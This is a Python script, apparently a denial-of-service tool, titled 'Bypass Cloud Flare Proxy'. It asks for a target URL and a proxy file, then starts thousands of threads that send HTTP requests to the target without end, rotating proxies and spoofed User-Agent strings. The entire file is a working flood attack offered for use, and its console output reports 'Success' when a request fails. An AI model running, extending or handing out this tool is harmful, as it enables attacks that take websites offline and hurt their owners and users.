#-- coding: utf8 --
#!/usr/bin/env python3
import urllib.request, os, threading, time, random, sys
from colorama import Fore, Back, Style
os.system('title Bypass Cloud Flare Proxy')
colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
c_color = random.choice(colors)
nice = (Fore.YELLOW+Style.BRIGHT+"[+] "+
    Style.RESET_ALL+Fore.GREEN+Style.BRIGHT)
fail = (Fore.YELLOW+Style.BRIGHT+
    Style.RESET_ALL+Fore.RED+Style.BRIGHT)
for i in range(1,31):
  print("\033[F"+"["+("#"*i)+"]")
  time.sleep(0.1)
os.system("cls")
	
useragents = [
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
      ]	
	
class fucker(threading.Thread):
    
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : random.choice(useragents) }
        self.Lock = threading.Lock()
        self.proxy = proxy

    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        print(str(nice+"Attack - Proxy to "+Fore.YELLOW+Style.BRIGHT+"%s"%self.url+Fore.BLUE+": %s :"%self.proxy+fail+"connection.BypassCloudflare\r"+Style.RESET_ALL))
            
    def run(self):
        global Close, Request, Tot_req
        self.Lock.acquire()
        self.Lock.release()
        while True:
            try:
                self.request()
            except:
                sys.stdout.write(str(nice+"Attack - Proxy to "+Fore.YELLOW+Style.BRIGHT+"%s"%self.url+Fore.BLUE+": %s :"%self.proxy+Fore.GREEN +"SuccessBypassCloudflare\n"+Style.RESET_ALL))
                sys.exit(0)
        sys.exit(0)

class MainLoop():

    def home(self):
        global Close, Request, Tot_req
        banner = """
        ###############################
          Https Bypass CF default
             (Code : NING)    
        ###############################
        """
        clrs = print(c_color+banner+W)
        try:
            url = input('URL : ')
        except:
            url = input('URL : ')
        try:
            file_proxy = str(input('[$]File Proxy : '))
            in_file = open(file_proxy,"r")
        except:
            file_proxy = str(input('[$]File Proxy : '))
            in_file = open(file_proxy,"r")
        num_threads = str(input('[#]Thread(2000) : '))
        if num_threads == "":
            num_threads = int(8000)
            print("[#]Thread(2000) : ")
        else:
            num_threads = int(num_threads)
        for i in range(num_threads):
            in_line = in_file.readline().splitlines()[0]
            fucker(url, i + 1, in_line).start()
            in_line = in_line[:-1]
        
if __name__ == '__main__':
    MainLoop().home()
